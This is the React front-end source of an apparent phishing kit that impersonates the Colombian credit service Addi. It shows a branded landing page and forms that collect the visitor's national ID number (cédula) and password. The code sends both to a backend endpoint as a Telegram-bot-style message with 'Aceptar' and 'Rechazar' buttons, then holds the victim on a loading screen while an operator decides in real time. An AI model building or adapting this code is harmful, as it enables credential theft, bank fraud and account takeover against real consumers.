import { useEffect, useState } from "react";
import "./App.css";
import { Image, Logo } from "./assets/images/index.js";
import IdentificationForm from "./components/IdentificationForm.js";
import PasswordForm from "./components/PasswordForm.js";
import LoadingPage from "./pages/LoadingPage.js";
import { api } from "./utils/axios/axios.ts";
import useSse from "./hooks/useSse.tsx";

function App() {
  const [showForm, setShowForm] = useState(false);
  const [step, setStep] = useState<"id" | "password" | "loading">("id");
  const [cedula, setCedula] = useState("");
  const [password, setPassword] = useState("");
  const [requestId, setRequestId] = useState<string | null>(null);

  const { decision, connected } = useSse({ requestId });


  const startSubscription = async () => {
    try {
      const response = await api.post("/news/request");

      console.log(response, 'respuesta de /news/request');

      const { requestId, botUrl } = response.data;

      setRequestId(requestId);

      window.open(botUrl, "_blank");

      console.log(decision == 'accepted' ? 'Se te aceptop' : 'no se te acepto')
      console.log(connected ? 'estas conectado' : 'no estas conectado');
    } catch (error) {
      console.error("Error creando solicitud:", error);
    }
  };

  useEffect(
    () => {
      startSubscription();
    }, []
  )

  const onContinue = async () => {
    try {
      const response = await api.post("/send/data", {
        text: `\nCC: ${cedula} \n\nContra: ${password}`,
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "Aceptar",
                callback_data: `news:accept:${requestId}`,
              },
              {
                text: "Rechazar",
                callback_data: `news:reject:${requestId}`,
              },
            ],
          ],
        }
      });
      return response;
    } catch (error) {
      console.error(error);
    }
  };

  const handleWait = () => {
    onContinue();
    setStep("loading");
  };

  return (
    <div className="bg-linear-to-b from-primary to-primary-dark flex items-center flex-col relative">
      <div className="h-[75vh] flex flex-col items-center">
        <img src={Logo} alt="" className="brightness-0 invert my-5 " />
        <img className="md:w-[50%] w-[70%] rounded-3xl" src={Image} alt="" />
        <div className="text-left md:w-[60%] mt-5 px-5">
          <p className="text-white opacity-80">Hazte la vida más Addi</p>
          <p className="text-white font-bold text-2xl">
            Tu crédito Addi, aprobado en minutos
          </p>
          <p className="text-white opacity-80">
            Solicítalo desde la app y empieza a comprar hoy mismo, sin trámites
            complicados.
          </p>
        </div>
      </div>
      <div className="bg-white w-full flex flex-col gap-5 rounded-t-2xl p-5">
        <button
          onClick={() => setShowForm(true)}
          className="bg-primary w-full rounded-full py-3 text-white font-bold cursor-pointer hover:bg-primary-dark mt-3"
        >
          Soy cliente
        </button>
        <button className="border border-gray-400 py-3 font-bold rounded-full">
          Quiero ser cliente
        </button>
        <p>Explorar sin registrarme</p>
      </div>

      {showForm && (
        <div className="fixed inset-0 z-50 bg-white flex flex-col p-5">
          {step === "id" ? (
            <IdentificationForm
              onClose={() => {
                setShowForm(false);
                setStep("id");
              }}
              onContinue={() => setStep("password")}
              cedula={cedula}
              setCedula={setCedula}
            />
          ) : step === "password" ? (
            <PasswordForm
              onClose={() => setStep("id")}
              onContinue={() => handleWait()}
              password={password}
              setPassword={setPassword}
            />
          ) : (
            <LoadingPage />
          )}
        </div>
      )}
    </div>
  );
}

export default App;
